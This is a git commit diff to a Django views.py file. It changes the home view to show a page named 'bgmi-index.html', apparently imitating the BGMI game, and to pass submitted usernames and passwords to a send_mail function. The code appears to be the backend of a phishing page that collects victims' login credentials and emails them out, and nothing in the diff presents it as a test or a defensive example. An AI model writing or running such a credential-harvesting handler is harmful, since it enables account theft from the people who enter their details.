48889b41986e5dcbfc85f544e8937b7e3c0b10dc
Praveenjadi <155786750+Praveenjadi@users.noreply.github.com>
2024-01-09 16:03:47 +0530

    Update views.py

--- index/views.py
+++ index/views.py
@@ -4,9 +4,14 @@ from django.http import HttpResponse
 
 # Create your views here.
 
-def home_view(request):
-    num = send_mail() 
-    if num == 1 :
-        return HttpResponse('<h1>ERROR</h1>') 
-    return HttpResponse('<h1>Sent</h1>')
+def home_view(request): 
+    if request.method == 'POST': 
+        usr = request.POST.get('username')
+        pwd = request.POST.get('password')
+        num = send_mail(usr,pwd) 
+        if num == 1 :
+            return HttpResponse('<h1>ERROR</h1>') 
+        return HttpResponse('<h1>Sent</h1>')
+    else :
+        return render(request,'bgmi-index.html',{})
 
